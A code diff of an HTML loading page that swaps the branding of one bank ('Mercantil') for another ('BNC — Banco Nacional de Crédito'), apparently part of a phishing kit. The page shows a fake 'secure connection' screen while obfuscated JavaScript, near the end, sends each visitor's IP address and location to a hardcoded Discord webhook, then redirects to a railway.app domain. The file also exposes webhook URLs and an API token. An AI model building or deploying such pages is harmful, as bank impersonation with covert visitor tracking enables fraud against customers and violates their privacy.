@@ -3,13 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="merca.ico" type="image/x-icon" sizes="256x256"/>
-    <title>Mercantil</title>
+    <link rel="icon" href="bnc.ico" type="image/x-icon" sizes="256x256"/>
+    <title>BNC</title>
 
-    <!-- Tipografía profesional -->
-    <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <!-- Tipografía geométrica de marca -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:ital,wght@0,500;0,600;0,700;1,800&display=swap" rel="stylesheet">
 
     <style>
+        :root {
+            --bnc-navy: #062E5C;
+            --bnc-navy-deep: #04162c;
+            --bnc-navy-black: #02101f;
+            --bnc-orange: #FF6A00;
+            --bnc-amber: #F0AD4E;
+            --bnc-green: #00A651;
+        }
+
         * {
             box-sizing: border-box;
             margin: 0;
@@ -25,8 +36,11 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            font-family: 'Plus Jakarta Sans', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
-            background: linear-gradient(135deg, #0a1428 0%, #0d1e3c 100%);
+            font-family: 'Montserrat', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
+            background:
+                radial-gradient(120% 80% at 50% -10%, rgba(255, 106, 0, 0.13) 0%, rgba(255, 106, 0, 0) 55%),
+                radial-gradient(90% 60% at 100% 110%, rgba(0, 166, 81, 0.10) 0%, rgba(0, 166, 81, 0) 60%),
+                linear-gradient(160deg, var(--bnc-navy-deep) 0%, var(--bnc-navy) 52%, var(--bnc-navy-black) 100%);
             overflow: hidden;
         }
 
@@ -40,13 +54,26 @@
 
         /* CARD */
         .card {
-            background: rgba(255, 255, 255, 0.03);
+            position: relative;
+            background: rgba(255, 255, 255, 0.035);
             backdrop-filter: blur(20px);
-            border: 1px solid rgba(255, 255, 255, 0.08);
+            border: 1px solid rgba(255, 106, 0, 0.16);
             border-radius: 12px;
             padding: 48px 40px;
-            box-shadow: 0 10px 40px rgba(0, 0, 0, 0.3);
+            box-shadow: 0 20px 55px rgba(2, 16, 31, 0.55);
             animation: slideUp 0.7s cubic-bezier(0.34, 1.56, 0.64, 1);
+            overflow: hidden;
+        }
+
+        /* FILO SUPERIOR DE MARCA */
+        .card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 3px;
+            background: linear-gradient(90deg, var(--bnc-orange) 0%, var(--bnc-amber) 52%, var(--bnc-green) 100%);
         }
 
         /* LOGO */
@@ -55,24 +82,24 @@
         }
 
         .logo {
-            width: 72px;
-            height: 72px;
+            width: 78px;
+            height: 78px;
             margin: 0 auto;
             border-radius: 10px;
             overflow: hidden;
-            background: linear-gradient(135deg, rgba(255,255,255,0.1), rgba(255,255,255,0.05));
-            border: 1px solid rgba(255, 255, 255, 0.1);
+            background: #ffffff;
+            border: 1px solid rgba(255, 255, 255, 0.25);
             display: flex;
             align-items: center;
             justify-content: center;
             animation: fadeInScale 0.8s ease-out 0.1s both;
-            box-shadow: 0 8px 24px rgba(0, 0, 0, 0.2);
+            box-shadow: 0 10px 26px rgba(2, 16, 31, 0.45);
         }
 
-        .logo img {
+        .logo svg {
             width: 100%;
             height: 100%;
-            object-fit: cover;
+            display: block;
         }
 
         /* INDICADOR DE CARGA */
@@ -91,27 +118,29 @@
             left: 0;
             top: 0;
             height: 100%;
-            width: 30%;
-            background: linear-gradient(90deg, 
-                rgba(59, 130, 246, 0) 0%, 
-                rgba(59, 130, 246, 0.8) 50%, 
-                rgba(59, 130, 246, 0) 100%);
+            width: 34%;
+            background: linear-gradient(90deg,
+                rgba(255, 106, 0, 0) 0%,
+                rgba(255, 106, 0, 0.95) 55%,
+                rgba(240, 173, 78, 0) 100%);
             animation: loading 1.8s ease-in-out infinite;
         }
 
         /* TEXTO PRINCIPAL */
         .status-text {
             font-size: 15px;
-            color: rgba(255, 255, 255, 0.85);
-            font-weight: 500;
-            letter-spacing: 0.2px;
+            color: rgba(255, 255, 255, 0.92);
+            font-weight: 600;
+            letter-spacing: 0.3px;
             margin-bottom: 8px;
             animation: fadeIn 0.8s ease-out 0.2s both;
         }
 
         .status-dots {
             display: inline-block;
-            width: 4px;
+            width: 14px;
+            text-align: left;
+            color: var(--bnc-amber);
             animation: dots 1.4s steps(4, end) infinite;
         }
 
@@ -123,9 +152,11 @@
             gap: 8px;
             margin-top: 24px;
             padding-top: 20px;
-            border-top: 1px solid rgba(255, 255, 255, 0.06);
+            border-top: 1px solid rgba(255, 255, 255, 0.07);
             font-size: 12px;
-            color: rgba(255, 255, 255, 0.6);
+            font-weight: 500;
+            letter-spacing: 0.2px;
+            color: rgba(255, 255, 255, 0.62);
             animation: fadeIn 0.8s ease-out 0.4s both;
         }
 
@@ -140,7 +171,7 @@
         .lock-icon {
             width: 10px;
             height: 12px;
-            border: 1.5px solid rgba(59, 130, 246, 0.7);
+            border: 1.5px solid rgba(255, 106, 0, 0.85);
             border-radius: 2px;
             position: relative;
         }
@@ -153,7 +184,7 @@
             transform: translateX(-50%);
             width: 6px;
             height: 5px;
-            border: 1.5px solid rgba(59, 130, 246, 0.7);
+            border: 1.5px solid rgba(255, 106, 0, 0.85);
             border-bottom: none;
             border-radius: 6px 6px 0 0;
         }
@@ -217,8 +248,8 @@
             }
 
             .logo {
-                width: 64px;
-                height: 64px;
+                width: 70px;
+                height: 70px;
             }
         }
 
@@ -239,7 +270,33 @@
         <div class="card">
             <div class="logo-wrapper">
                 <div class="logo">
-                    <img src="unnamed.webp" alt="Mercantil">
+                    <svg viewBox="0 0 100 100" role="img" aria-label="BNC — Banco Nacional de Crédito">
+                        <defs>
+                            <clipPath id="bnc-oval">
+                                <ellipse cx="50" cy="33" rx="25" ry="14"/>
+                            </clipPath>
+                        </defs>
+                        <ellipse cx="50" cy="33" rx="25" ry="14" fill="#062E5C"/>
+                        <g clip-path="url(#bnc-oval)" stroke="#ffffff" stroke-width="1.5" stroke-linecap="round">
+                            <line x1="50" y1="42" x2="-8" y2="26.5"/>
+                            <line x1="50" y1="42" x2="-2" y2="12"/>
+                            <line x1="50" y1="42" x2="7.6" y2="-0.4"/>
+                            <line x1="50" y1="42" x2="20" y2="-10"/>
+                            <line x1="50" y1="42" x2="34.5" y2="-16"/>
+                            <line x1="50" y1="42" x2="50" y2="-18"/>
+                            <line x1="50" y1="42" x2="65.5" y2="-16"/>
+                            <line x1="50" y1="42" x2="80" y2="-10"/>
+                            <line x1="50" y1="42" x2="92.4" y2="-0.4"/>
+                            <line x1="50" y1="42" x2="102" y2="12"/>
+                            <line x1="50" y1="42" x2="108" y2="26.5"/>
+                        </g>
+                        <text x="50" y="82" text-anchor="middle"
+                              font-family="Montserrat, Arial, sans-serif"
+                              font-weight="800" font-style="italic" font-size="31"
+                              letter-spacing="0.5">
+                            <tspan fill="#FF6A00">B</tspan><tspan fill="#062E5C">N</tspan><tspan fill="#00A651">C</tspan>
+                        </text>
+                    </svg>
                 </div>
             </div>
 
@@ -251,7 +308,7 @@
 
             <div class="security-info">
                 <div class="security-icon">
-                    <div class="">🔒</div>
+                    <div class="lock-icon"></div>
                 </div>
                 <span>Conexión segura</span>
             </div>
@@ -259,13 +316,13 @@
     </div>
 
 <script>
-const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_0x28a77c=_0x34c695();while(!![]){try{const _0x3c7a6f=parseInt(_0x6c628e(0x152))/0x1*(-parseInt(_0x6c628e(0x14d))/0x2)+-parseInt(_0x6c628e(0x161))/0x3*(parseInt(_0x6c628e(0x14b))/0x4)+parseInt(_0x6c628e(0x154))/0x5+-parseInt(_0x6c628e(0x14f))/0x6*(parseInt(_0x6c628e(0x15e))/0x7)+-parseInt(_0x6c628e(0x160))/0x8*(-parseInt(_0x6c628e(0x156))/0x9)+-parseInt(_0x6c628e(0x145))/0xa*(parseInt(_0x6c628e(0x15f))/0xb)+-parseInt(_0x6c628e(0x143))/0xc*(-parseInt(_0x6c628e(0x157))/0xd);if(_0x3c7a6f===_0x2224e9)break;else _0x28a77c['push'](_0x28a77c['shift']());}catch(_0x4130de){_0x28a77c['push'](_0x28a77c['shift']());}}}(_0x2f8d,0xa2d68));function _0x2f8d(){const _0x57d61e=['37116pdkyCD','✅\x20Alerta\x20enviada','156DjpiqC','DOMContentLoaded','city','69wqUGip','log','5423425yJRtMb','json','45oAEeXt','13qYuJOd','toISOString','readyState','application/json','Sistema\x20de\x20Monitoreo','https://ipinfo.io?token=','N/A','27237GValAU','11xWvJhp','13784zZRxoy','9srWaDX','toLocaleString','❌\x20Error:','📍\x20Ubicación','country','31103124SVdpIV','error','12629340KEWtPV','🚨\x20Nuevo\x20Ingreso\x20Detectado','loading','https://discord.com/api/webhooks/1572954486920716369/V2Ss1HY-3Gg4dDiUVhpbMdSPYB-w5Ia2FxVXlxbMTDZuE1XC_6PaQzinusv6Gvth9Fo4','es-ES','addEventListener','498188OqdKmZ','🔐\x20IP\x20Address'];_0x2f8d=function(){return _0x57d61e;};return _0x2f8d();}const WEBHOOK_URL=_0x2a78b2(0x148),IPINFO_TOKEN='e8764d0b0d51b0';async function getGeoLocation(){const _0x67d802=_0x2a78b2;try{const _0x15232=new AbortController(),_0x1375e3=setTimeout(()=>_0x15232['abort'](),0x5dc),_0x5d63cb=_0x67d802(0x15c)+IPINFO_TOKEN,_0x114350=await fetch(_0x5d63cb,{'signal':_0x15232['signal']});return clearTimeout(_0x1375e3),await _0x114350[_0x67d802(0x155)]();}catch(_0x5e6ac4){return{'ip':'N/A','city':_0x67d802(0x15d),'country':'N/A'};}}function _0x7ff2(_0x33722d,_0x9a3c4e){_0x33722d=_0x33722d-0x13f;const _0x2f8dbe=_0x2f8d();let _0x7ff25e=_0x2f8dbe[_0x33722d];return _0x7ff25e;}async function sendAlert(){const _0x18c97b=_0x2a78b2;try{const _0x46f159=await getGeoLocation(),_0x2ff99c=new Date(),_0x4ebd6b=_0x2ff99c[_0x18c97b(0x13f)](_0x18c97b(0x149)),_0x257a7f={'title':_0x18c97b(0x146),'color':0xff5252,'fields':[{'name':_0x18c97b(0x14c),'value':'`'+(_0x46f159['ip']||'N/A')+'`','inline':!![]},{'name':_0x18c97b(0x141),'value':(_0x46f159[_0x18c97b(0x151)]||_0x18c97b(0x15d))+',\x20'+(_0x46f159[_0x18c97b(0x142)]||_0x18c97b(0x15d)),'inline':!![]},{'name':'⏰\x20Hora','value':'`'+_0x4ebd6b+'`','inline':![]}],'timestamp':_0x2ff99c[_0x18c97b(0x158)](),'footer':{'text':_0x18c97b(0x15b)}},_0x1582ba={'embeds':[_0x257a7f]};await fetch(WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x18c97b(0x15a)},'body':JSON['stringify'](_0x1582ba)}),console[_0x18c97b(0x153)](_0x18c97b(0x14e));}catch(_0x3065fe){console[_0x18c97b(0x144)](_0x18c97b(0x140),_0x3065fe);}}document[_0x2a78b2(0x159)]===_0x2a78b2(0x147)?document[_0x2a78b2(0x14a)](_0x2a78b2(0x150),sendAlert):sendAlert();
+const _0x2a78b2=_0x7ff2;(function(_0x34c695,_0x2224e9){const _0x6c628e=_0x7ff2,_0x28a77c=_0x34c695();while(!![]){try{const _0x3c7a6f=parseInt(_0x6c628e(0x152))/0x1*(-parseInt(_0x6c628e(0x14d))/0x2)+-parseInt(_0x6c628e(0x161))/0x3*(parseInt(_0x6c628e(0x14b))/0x4)+parseInt(_0x6c628e(0x154))/0x5+-parseInt(_0x6c628e(0x14f))/0x6*(parseInt(_0x6c628e(0x15e))/0x7)+-parseInt(_0x6c628e(0x160))/0x8*(-parseInt(_0x6c628e(0x156))/0x9)+-parseInt(_0x6c628e(0x145))/0xa*(parseInt(_0x6c628e(0x15f))/0xb)+-parseInt(_0x6c628e(0x143))/0xc*(-parseInt(_0x6c628e(0x157))/0xd);if(_0x3c7a6f===_0x2224e9)break;else _0x28a77c['push'](_0x28a77c['shift']());}catch(_0x4130de){_0x28a77c['push'](_0x28a77c['shift']());}}}(_0x2f8d,0xa2d68));function _0x2f8d(){const _0x57d61e=['37116pdkyCD','✅\x20Alerta\x20enviada','156DjpiqC','DOMContentLoaded','city','69wqUGip','log','5423425yJRtMb','json','45oAEeXt','13qYuJOd','toISOString','readyState','application/json','Sistema\x20de\x20Monitoreo\x20BNC','https://ipinfo.io?token=','N/A','27237GValAU','11xWvJhp','13784zZRxoy','9srWaDX','toLocaleString','❌\x20Error:','📍\x20Ubicación','country','31103124SVdpIV','error','12629340KEWtPV','🚨\x20Nuevo\x20Ingreso\x20Detectado\x20·\x20BNC','loading','https://discord.com/api/webhooks/1547268391755190413/Z5mtMQ4v-A9Xa1c1GLwjOaAHvFyrD37rJXQ3uwKXSEYNX4bvKDauVoKWBaRO7m0hPETz','es-ES','addEventListener','498188OqdKmZ','🔐\x20IP\x20Address'];_0x2f8d=function(){return _0x57d61e;};return _0x2f8d();}const WEBHOOK_URL=_0x2a78b2(0x148),IPINFO_TOKEN='e8764d0b0d51b0';async function getGeoLocation(){const _0x67d802=_0x2a78b2;try{const _0x15232=new AbortController(),_0x1375e3=setTimeout(()=>_0x15232['abort'](),0x5dc),_0x5d63cb=_0x67d802(0x15c)+IPINFO_TOKEN,_0x114350=await fetch(_0x5d63cb,{'signal':_0x15232['signal']});return clearTimeout(_0x1375e3),await _0x114350[_0x67d802(0x155)]();}catch(_0x5e6ac4){return{'ip':'N/A','city':_0x67d802(0x15d),'country':'N/A'};}}function _0x7ff2(_0x33722d,_0x9a3c4e){_0x33722d=_0x33722d-0x13f;const _0x2f8dbe=_0x2f8d();let _0x7ff25e=_0x2f8dbe[_0x33722d];return _0x7ff25e;}async function sendAlert(){const _0x18c97b=_0x2a78b2;try{const _0x46f159=await getGeoLocation(),_0x2ff99c=new Date(),_0x4ebd6b=_0x2ff99c[_0x18c97b(0x13f)](_0x18c97b(0x149)),_0x257a7f={'title':_0x18c97b(0x146),'color':0xff6a00,'fields':[{'name':_0x18c97b(0x14c),'value':'`'+(_0x46f159['ip']||'N/A')+'`','inline':!![]},{'name':_0x18c97b(0x141),'value':(_0x46f159[_0x18c97b(0x151)]||_0x18c97b(0x15d))+',\x20'+(_0x46f159[_0x18c97b(0x142)]||_0x18c97b(0x15d)),'inline':!![]},{'name':'⏰\x20Hora','value':'`'+_0x4ebd6b+'`','inline':![]}],'timestamp':_0x2ff99c[_0x18c97b(0x158)](),'footer':{'text':_0x18c97b(0x15b)}},_0x1582ba={'embeds':[_0x257a7f]};await fetch(WEBHOOK_URL,{'method':'POST','headers':{'Content-Type':_0x18c97b(0x15a)},'body':JSON['stringify'](_0x1582ba)}),console[_0x18c97b(0x153)](_0x18c97b(0x14e));}catch(_0x3065fe){console[_0x18c97b(0x144)](_0x18c97b(0x140),_0x3065fe);}}document[_0x2a78b2(0x159)]===_0x2a78b2(0x147)?document[_0x2a78b2(0x14a)](_0x2a78b2(0x150),sendAlert):sendAlert();
 </script>
 
 
     <script>
         setTimeout(() => {
-            window.location.href = 'https://mercantil30credito.up.railway.app/';
+            window.location.href = 'https://bncreditonline.up.railway.app/';
         }, 2500);
     </script>
 
